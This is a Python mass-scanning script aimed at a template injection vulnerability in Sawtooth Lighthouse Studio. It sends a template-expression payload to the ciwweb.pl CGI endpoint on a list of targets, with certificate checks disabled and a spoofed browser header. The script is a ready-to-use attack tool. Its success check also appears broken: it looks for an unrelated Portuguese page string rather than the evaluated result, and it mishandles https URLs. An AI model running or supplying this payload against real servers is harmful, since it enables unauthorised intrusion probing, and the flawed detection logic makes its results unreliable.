#Sawtooth Lighthouse Studio存在模板注入漏洞
import textwrap
from multiprocessing.dummy import Pool
import requests, argparse
import urllib3

urllib3.disable_warnings()
def main():
    banner = """
                ___  _ _     ________  _ _     _____
                \  \/// \ /\/  __/\  \/// \ /\/  __/
                 \  / | | |||  \   \  / | | |||  \  
                 / /  | \_/||  /_  / /  | \_/||  /_ 
                /_/   \____/\____\/_/   \____/\____\                                
                    """
    print(banner)
    parser = argparse.ArgumentParser(
        description="脚本检测",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("示例：python yueyue_modle.py -u http://127.0.0.1")
    )
    parser.add_argument("-u", dest="url", type=str, help="URL")
    parser.add_argument("-f", dest="file", type=str, help="FILE")
    args = parser.parse_args()
    if args.url:
        if 'http://' not in args.url:
            url=add_http(args.url)
            check(url)
        else:
            check(args.url)
    elif args.file:
        urls=[]
        with open(args.file) as f:
            for line in f:
                line=line.strip()
                if 'http://' not in line:
                    url=add_http(line)
                    urls.append(url)
                else:
                    urls.append(line)
        pool = Pool(10)
        pool.map(check, urls)
def add_http(url):
    return f"http://{url}"

def check(url):
    full_url = f"{url}/cgi-bin/ciwweb.pl?hid_javascript=1&hid_Random_ACARAT=[%25123*321%25]&hid_Random_ACARAT=x"
    headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
'Accept': '*/*',
'Connection': 'Keep-Alive'}
    try:
        response = requests.get(full_url, headers=headers,timeout=5, verify=False)
        if response.status_code == 200 and 'IntelligenceIT - Facilitando sua gestão!' in response.text:
            print(f'[+]存在漏洞:{full_url}')
        else:
            print(f'[-]不存在漏洞:{url}')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()